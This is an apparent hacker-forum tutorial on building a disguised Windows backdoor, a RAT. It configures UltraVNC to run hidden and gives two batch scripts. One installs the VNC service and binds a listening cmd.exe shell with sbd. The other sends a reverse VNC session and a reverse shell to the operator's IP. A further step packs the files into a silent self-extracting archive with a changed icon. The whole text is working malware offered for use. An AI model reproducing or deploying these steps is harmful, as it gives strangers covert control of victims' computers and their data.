 TOOLS NEEDED

•1.) a brain
•2.) code of ethics
•3.) Windows Machine
•4.) Archiving application (WinRAR, 7Zip, WinZip)
•5.) IExpress 2.0
•6.) UltraVNC or WinVNC (based off the same engine)
•7.) Netcat (or netcat clone. i'll be using sbd)
•8.) wget (Windows)
•9.) wput(Windows)
•10.) WILL TO READ....

THE SETUP

First you must extract the VNC server to a folder. Something like "n00b"
All you need there is winvnc.exe and the DLLs everything else can be removed.
So now you should have winvnc.exe and DLLS. No other folders.
Create a new folder named "bins" place sbd.exe and sbdbg.exe inside there.
Now create a folder named "ft" place the wget.exe and wput.exe (and the two dlls that wput need to run).

NOTE: The file structure does NOT have to be like this, however makes things A LOT easier.

SETTING UP THE VNC SERVER

This is pretty much everyone's question. Run winvnc.exe, leave the defaults EXCEPT

•Remove Wallpaper = UNCHECKED
•Enable Blank Monitor on Viewer Request = UNCHECKED
•Allow loopback = CHECKED
•Disable Tray Icon = CHECKED
•Disable clients options in tray icon menu = CHECKEd
•Forbid users to close down WinVNC = CHECKED

Then click OK.

Once that's done you have the configuration in the registry. We're going to fetch it.
Click Start->Run
and type regedit
Navigate to "HKLM\Software\ORL" right click it and select "Export". Save it in the folder we made named "noob". Name it something like install1.reg
Now, navigate to "HKCU\Software\ORL" right click it and select "Export". Save that to the "noob" folder too.
Name it something like install2.reg
There you go. VNC is now set up.

STANDARD INSTALLION SCRIPT

I'm not going to explain the following to you.
So try to learn and read the programmer comments.
Open up notepad, and paste the following

Code:
@echo off

REM nice litte banner
echo **
echo *  UDPError LAME Rat  *
echo **
echo.
echo Setting up VNC registry entries

REM Add the registry settings
regedit /S install1.reg
regedit /S install2.reg
echo Done.
Creating system service...

REM Add to system startup.
winvnc.exe -install
echo Done.
echo Creating backdoor

REM This is a STANDARD backdoor, LISTENINg if you want it to "reverse" you need to use the second method
bin\sbd.exe -D on -k UPD32202 -q -lp 3690 -r 15 -e cmd.exe
echo Done.
goto exit

:exit
exit

Click "File->Save As" make sure you select "All Files" and name it "install.bat"

You would use this method if you know the user is not behind a router or firewall.
If you don't know what any of the switches on here do then don't use it.
I'm not going to explain it to you. The last thing we need are skiddies doing this.

COMPLEX INSTALLATION METHOD

Code:
@echo off

REM nice litte banner
echo **
echo *  UDPError LAME Rat  *
echo **
echo.
echo Setting up VNC registry entries

REM Add the registry settings
regedit /S install1.reg
regedit /S install2.reg
echo Done.
Creating system service...

REM Add to system startup.
winvnc.exe -install
winvnc.exe -connect YOU.IP.ADDRESS.HERE::5900

REM Make sure you have your viewer on listening move before you do this.
echo Done.
echo Creating backdoor

REM Make sure you open the port on your router.
bin\sbd.exe -D on -k UPD32202 -qp 3690 YOUR.IP.ADDRESS.HERE -r 15 -e cmd.exe
echo Done.
goto exit

:exit
exit

Save as the above "File->Save As" then "Show All Files" and name it install.bat
Be sure to open the ports on your router, and make sure you have the vncclient in listening mode,
as well as the password.

PUTTING IT ALL TOGETHER

Now here's the fun part. Your backdoor is created. You just have to pack it now.
Why use packers that are already patched? Use WinRAR/WinZip/7Zip! For this purpose
I'll be using WinRAR (easier).

Right click the folder "noob" select "Add to Archive"
Select "Create SFX"
name the file "sweetness.exe"
then go to "SFX Options"
Select the path to extract it to,
Run after "extraction" is the "install.bat"
so let's say you have the path set to "C:\" you would put "C:\noob\install.bat"
Then click on modes, and select "Hide All" and "Overwrite all files".
Then click "OK" click it again.
Boom! PACKED!

Use a program like ResourceExtractor to change the icon, and you have yourself a backdoor
